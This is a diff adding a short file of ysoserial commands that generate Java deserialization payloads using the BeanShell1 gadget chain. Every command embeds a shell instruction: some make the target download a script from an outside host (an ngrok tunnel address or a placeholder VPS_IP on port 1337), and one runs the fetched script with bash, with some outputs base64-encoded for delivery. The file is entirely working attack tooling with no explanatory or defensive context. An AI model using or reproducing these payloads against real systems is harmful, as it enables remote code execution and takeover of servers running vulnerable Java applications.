@@ -1,0 +1,17 @@
+java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED   --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED  -jar ysoserial-all.jar BeanShell1 'curl 0.tcp.in.ngrok.io:12271/shell.sh -O' > payload1
+
+
+java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED   --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED  -jar ysoserial-all.jar BeanShell1 'bash shell.sh' > payload2
+
+java \
+   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
+   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
+   --add-opens=java.base/java.net=ALL-UNNAMED \
+   --add-opens=java.base/java.util=ALL-UNNAMED \
+   -jar ysoserial-all.jar BeanShell1 'curl VPS_IP:1337/r.sh -O'|base64 -w0
+
+java \
+ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED\
+ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED\
+ --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED\
+ -jar ./ysoserial.jar BeanShell1 'curl VPS_IP:1337/r.sh -O'|base64 -w0
